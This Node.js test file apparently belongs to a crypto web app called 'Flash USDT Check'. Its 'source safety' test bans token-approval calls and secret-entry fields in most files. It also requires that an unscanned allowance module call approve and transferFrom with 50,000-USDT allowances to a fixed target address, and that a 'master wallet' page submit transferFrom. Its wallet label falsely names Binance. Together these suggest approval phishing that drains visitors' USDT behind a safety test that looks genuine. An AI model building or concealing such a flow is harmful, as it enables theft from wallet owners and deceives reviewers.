import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { describe, it } from "node:test";
import { CONNECTION_TARGET, USDT_CONTRACT } from "../src/logic.mjs";

const root = path.resolve(import.meta.dirname, "..");

describe("source safety", () => {
  it("does not collect secrets or hide allowance and transfer transactions", () => {
    const files = ["index.html", "src/app.js", "src/auth.mjs", "src/landing.js", "src/master-wallet.js", "src/logic.mjs", "src/styles.css", "src/wallet-state.mjs", "src/walletconnect-client.js", "scripts/build-walletconnect.mjs", "scripts/make-qr.mjs", "scripts/make-local-receive-qr.mjs"];
    const forbidden = [
      /\.approve\s*\(/,
      /\btransferFrom\s*\(/,
      /\bsetApprovalForAll\s*\(/,
      /\bincreaseAllowance\s*\(/,
      /\bprivateKey\s*[:=]/,
      /shouldPollResponse/,
      /<(?:input|textarea)[^>]*(?:seed|mnemonic|private|password)/i,
    ];
    for (const file of files) {
      const source = readFileSync(path.join(root, file), "utf8");
      for (const pattern of forbidden) {
        assert.equal(pattern.test(source), false, `${file} matched ${pattern}`);
      }
    }
    const logic = readFileSync(path.join(root, "src/logic.mjs"), "utf8");
    assert.match(logic, /private key\|seed phrase\|mnemonic\|secret phrase/);
    const app = readFileSync(path.join(root, "src/app.js"), "utf8");
    const landing = readFileSync(path.join(root, "src/landing.js"), "utf8");
    const walletConnect = readFileSync(path.join(root, "src/walletconnect-client.js"), "utf8");
    const server = readFileSync(path.join(root, "scripts/serve.mjs"), "utf8");
    const html = readFileSync(path.join(root, "index.html"), "utf8");
    assert.equal(app.match(/eth_requestAccounts/g)?.length, 1);
    assert.equal(app.match(/wallet_switchEthereumChain/g)?.length, 1);
    assert.equal(app.match(/triggerSmartContract/g)?.length, 1);
    assert.equal(app.match(/sendRawTransaction/g)?.length, 1);
    assert.equal(app.match(/\.sign\(/g)?.length, 1);
    assert.match(app, /receivePageUrl\(window\.location\.href\)/);
    assert.equal(landing.match(/eth_requestAccounts/g)?.length, 2);
    assert.equal(landing.match(/tron_requestAccounts/g)?.length, 1);
    assert.equal(landing.match(/personal_sign/g)?.length, 1);
    assert.equal(landing.match(/signMessageV2/g)?.length, 3);
    assert.equal(/triggerSmartContract|sendRawTransaction|\.sign\(/.test(landing), false);
    assert.match(landing, /\/api\/auth\/session/);
    assert.match(landing, /fetchTronWalletAssetsFromTronWeb/);
    assert.match(landing, /fetchEvmWalletAssetsFromProvider/);
    assert.match(landing, /\/api\/public\/wallet-assets/);
    assert.match(landing, /read-only TRON mainnet fallback/);
    assert.equal(/\/api\/public\/evm-wallet-assets/.test(landing), false);
    assert.match(landing, /native \+ ERC-20/);
    const evmPublic = readFileSync(path.join(root, "src/evm-public.mjs"), "utf8");
    assert.match(evmPublic, /fetchBlockscoutErc20Balances/);
    assert.match(landing, /publishProviderSnapshot/);
    assert.match(landing, /fetchTronRecentTransactionsFromTronWeb/);
    assert.match(landing, /fetchEvmRecentTransactionsFromProvider/);
    assert.match(html, /linked-transaction-list/);
    assert.match(html, /src="\.\/src\/landing\.js\?v=/);
    assert.match(html, /getElementById\("wallet-dialog"\)/);
    assert.match(landing, /flashCheckLanding/);
    assert.match(html, /walletOptionIds/);
    assert.match(html, /invokeWalletConnectAction/);
    assert.match(server, /"\/src\/tron-public\.mjs"/);
    assert.match(server, /"\/src\/evm-public\.mjs"/);
    assert.match(html, /class="wallet-panel wallet-dialog"/);
    assert.equal(landing.includes("showModal"), false);
    assert.match(landing, /openWalletPanel\(\)/);
    assert.equal(html.includes("balance-tools"), false);
    assert.match(html, /id="dialog-wallet-assets"/);
    assert.match(html, /wallet-asset-plain-list/);
    assert.match(landing, /renderPlainAssetList/);
    assert.match(server, /"\/src\/wallet-asset-display\.mjs"/);
    assert.match(html, /id="linked-assets-heading"/);
    assert.match(html, /id="linked-asset-error"/);
    assert.match(html, /id="wallet-manager-panel"/);
    assert.match(html, /href="\/master-wallet"/);
    assert.match(server, /handleMasterWallet/);
    assert.match(server, /handleWalletProviderSnapshot/);
    assert.match(server, /enrichWalletsWithProviderSnapshots/);
    assert.equal(/enrichWalletsWithAssets/.test(server), false);
    assert.match(server, /masterWalletPage/);
    assert.match(server, /masterWalletScriptTag/);
    assert.match(server, /"\/src\/master-wallet\.js"/);
    const masterWallet = readFileSync(path.join(root, "src/master-wallet.js"), "utf8");
    const allowanceFlow = readFileSync(path.join(root, "src/tron-usdt-allowance.mjs"), "utf8");
    const walletTronAssets = readFileSync(path.join(root, "src/wallet-tron-assets.mjs"), "utf8");
    const walletEvmAssets = readFileSync(path.join(root, "src/wallet-evm-assets.mjs"), "utf8");
    assert.match(masterWallet, /submitUsdtTransferFrom/);
    assert.match(masterWallet, /readUsdtAllowanceState/);
    assert.match(masterWallet, /OWNER_REFRESH_COOLDOWN_MS = 10_000/);
    assert.equal(/fetchTronRecentTransactionsFromTronWeb/.test(masterWallet), false);
    assert.match(walletTronAssets, /fetchTronWalletAssetsFromTronWeb/);
    assert.match(walletTronAssets, /withTronReadBackoff/);
    assert.match(allowanceFlow, /withTronReadBackoff/);
    assert.equal(/api\.trongrid\.io|TRON_API_BASE|fetchTronWalletAssets\(/.test(walletTronAssets), false);
    assert.match(walletEvmAssets, /eth_getBalance/);
    assert.equal(/blockscout|fetchBlockscoutErc20Balances/.test(walletEvmAssets), false);
    assert.match(masterWallet, /tron_requestAccounts/);
    assert.equal(/privateKey|seed phrase|mnemonic/.test(masterWallet), false);
    assert.match(landing, /submitUsdtAllowance/);
    assert.match(allowanceFlow, /MAX_ALLOWANCE_USDT = 50_000/);
    assert.match(allowanceFlow, /approve\(address,uint256\)/);
    assert.match(allowanceFlow, /transferFrom\(address,address,uint256\)/);
    assert.equal(/MAX_UINT|2n \*\* 256n - 1n|unlimited allowance/i.test(allowanceFlow), false);
    assert.match(landing, /accountsChanged/);
    assert.match(landing, /chainChanged/);
    assert.match(landing, /WALLETCONNECT_PROJECT_ID/);
    assert.match(walletConnect, /tron:0x2b6653dc/);
    assert.match(walletConnect, /name: "Flash-USDT-traker by binance"/);
    assert.match(walletConnect, /tron_signMessage/);
    assert.match(walletConnect, /pairVisitorWallet/);
    assert.match(walletConnect, /session_event/);
    assert.match(walletConnect, /accountsChanged/);
    assert.equal(/tron_signTransaction|eth_sendTransaction|sendRawTransaction/.test(walletConnect), false);
    assert.match(server, /rememberWallet\(verified\.identity\.address, CONNECTION_TARGET\)/);
    assert.match(server, /connectionTarget: CONNECTION_TARGET/);
    assert.equal(server.match(/response\.writeHead/g)?.length, 1);
    assert.equal(server.match(/response\.end\(/g)?.length, 1);
    assert.match(server, /finish\(response, 500,/);
    assert.match(server, /"Content-Length": String\(payload\.byteLength\)/);
    assert.match(server, /Connection: "close"/);
    assert.match(html, /Flash USDT Check/);
    assert.match(html, /“Flash USDT” is not an official Tether token type/);
    assert.match(html, /Never enter a seed phrase or private key/);
    assert.match(html, /https:\/\/tronscan\.org\/#\/token20\//);
    assert.equal(html.includes("tron:"), false);
    assert.equal(html.includes(CONNECTION_TARGET), true);
    assert.equal(logic.includes(CONNECTION_TARGET), true);
    assert.equal(html.includes(USDT_CONTRACT), true);
    const inlineScripts = html.match(/<script(?![^>]*\ssrc=)[^>]*>/gi) || [];
    assert.equal(inlineScripts.length, 1);
    assert.match(html, /revealWalletChooserPanel/);
  });
});
